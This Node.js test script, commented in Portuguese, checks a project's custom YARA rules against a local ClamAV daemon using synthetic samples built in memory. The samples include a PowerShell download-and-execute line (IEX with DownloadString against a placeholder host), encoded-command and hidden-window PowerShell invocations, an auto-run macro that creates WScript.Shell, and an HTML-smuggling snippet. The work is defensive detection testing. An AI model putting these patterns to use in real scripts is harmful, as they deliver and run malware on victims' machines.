#!/usr/bin/env node
// Confere as regras YARA proprias do Baluarte (antivirus/regras, B23) no ClamAV DE VERDADE.
//
// Monta amostras inofensivas EM MEMORIA (o marcador de teste, um documento sintetico com o texto
// de uma macro, scripts PowerShell de exemplo, um .lnk e um HTML montados byte a byte) e manda
// cada uma ao clamd pelo protocolo INSTREAM, como a API faz. Nada vai para disco e nada aqui e
// executavel: sao textos com os padroes que as regras procuram. As strings sao montadas a partir
// de partes para o fonte nao conter os padroes inteiros. Tambem confere que textos parecidos,
// mas legitimos, NAO disparam as regras.
//
// Uso: node scripts/validar-regras-yara.mjs   (clamd em CLAMAV_HOST:CLAMAV_PORT, padrao 127.0.0.1:3310,
//      que e o perfil `antivirus` do Compose). Sai com codigo 1 se alguma amostra der outro veredito.
// Se uma regra nao disparar, veja o log do clamav: o ClamAV descarta regra que nao entende com
// so um aviso ("cannot support", "failed to parse") e sobe sem ela.
import { connect } from 'node:net';

const HOST = process.env.CLAMAV_HOST || '127.0.0.1';
const PORTA = Number(process.env.CLAMAV_PORT || 3310);

const j = (...partes) => partes.join('');
const base64 = (n) => 'QUJD'.repeat(Math.ceil(n / 4)).slice(0, n);

const AMOSTRAS = [
  {
    nome: 'marcador de teste do Baluarte',
    esperado: 'YARA.BaluarteMarcadorTeste.UNOFFICIAL',
    dados: () => Buffer.from(j('relatorio\n', 'BALUARTE-TESTE-', 'AMEACA-0001-ARQUIVO-INOFENSIVO', '\n')),
  },
  {
    nome: 'documento sintetico com macro que abre e chama o sistema',
    esperado: 'YARA.BaluarteMacroSuspeita.UNOFFICIAL',
    dados: () => Buffer.from(j('Attribute VB_Name = "ThisDocument"\n', 'Sub Document', '_Open()\n',
      '  Set s = Create', 'Object("WScript.', 'Shell")\n', "  ' documento sintetico: nada e executado\n", 'End Sub\n')),
  },
  {
    nome: 'PowerShell que baixa e executa (IEX + DownloadString)',
    esperado: 'YARA.BaluartePowerShellBaixaExecuta.UNOFFICIAL',
    dados: () => Buffer.from(j('$u = "http://exemplo.invalid/x"\n', 'I', 'EX (New-Object Net.Web', 'Client).Download', 'String($u)\n')),
  },
  {
    nome: 'PowerShell com comando em base64 (-EncodedCommand)',
    esperado: 'YARA.BaluartePowerShellBaixaExecuta.UNOFFICIAL',
    dados: () => Buffer.from(j('power', 'shell.exe -NoP -Encoded', 'Command ', base64(60), '\n')),
  },
  {
    nome: 'atalho .lnk chamando o PowerShell com base64 grande',
    esperado: 'YARA.BaluarteLnkPayloadBase64.UNOFFICIAL',
    dados: () => Buffer.concat([
      Buffer.from([0x4c, 0, 0, 0, 0x01, 0x14, 0x02, 0, 0, 0, 0, 0, 0xc0, 0, 0, 0, 0, 0, 0, 0x46]),
      Buffer.alloc(56),
      Buffer.from(j('power', 'shell -w hidden -e ', base64(600)), 'utf16le'),
    ]),
  },
  {
    nome: 'HTML que remonta arquivo de base64 grande (HTML smuggling)',
    esperado: 'YARA.BaluarteHtmlPayloadBase64.UNOFFICIAL',
    dados: () => Buffer.from(j('<html><body><script>var d=at', 'ob("', base64(3000), '");var b=new Bl', 'ob([d]);</script></body></html>')),
  },
  { nome: 'macro automatica sem chamada ao sistema', esperado: null, dados: () => Buffer.from(j('Sub Auto', 'Open()\n  MsgBox "ola"\nEnd Sub\n')) },
  {
    nome: 'HTML com imagem grande embutida (sem remontagem)',
    esperado: null,
    dados: () => Buffer.from(j('<html><body><img src="data:image/png;base64,', base64(5000), '"></body></html>')),
  },
  { nome: 'texto comum', esperado: null, dados: () => Buffer.from('Ata da reuniao de segunda-feira.\n') },
];

/** INSTREAM: "zINSTREAM\0" + [tamanho 4 bytes][dados] + 4 bytes zero; resposta termina em \0. */
function analisar(dados) {
  return new Promise((ok, falha) => {
    const socket = connect({ host: HOST, port: PORTA });
    socket.setTimeout(60_000);
    let resposta = '';
    socket.on('data', (d) => { resposta += d.toString('utf8'); });
    socket.on('end', () => ok(resposta.replace(/\0/g, '').trim()));
    socket.on('timeout', () => { socket.destroy(); falha(new Error('tempo esgotado no clamd')); });
    socket.on('error', falha);
    socket.on('connect', () => {
      const tamanho = Buffer.alloc(4);
      tamanho.writeUInt32BE(dados.length);
      socket.end(Buffer.concat([Buffer.from('zINSTREAM\0'), tamanho, dados, Buffer.alloc(4)]));
    });
  });
}

let falhas = 0;
for (const a of AMOSTRAS) {
  let resposta;
  try {
    resposta = await analisar(a.dados());
  } catch (e) {
    console.error(`clamd indisponivel em ${HOST}:${PORTA}: ${e.message}`);
    console.error('Suba o perfil antivirus: docker compose --profile antivirus up -d clamav');
    process.exit(2);
  }
  const achado = resposta.match(/^stream: (.+) FOUND$/)?.[1] ?? null;
  const certo = resposta === 'stream: OK' ? a.esperado === null : achado === a.esperado;
  if (!certo) falhas += 1;
  console.log(`${certo ? 'ok   ' : 'FALHA'} ${a.nome}: ${resposta}${certo ? '' : ` (esperado: ${a.esperado ?? 'OK'})`}`);
}
console.log(falhas ? `\n${falhas} amostra(s) com veredito inesperado` : `\nTodas as ${AMOSTRAS.length} amostras com o veredito esperado`);
process.exit(falhas ? 1 : 0);
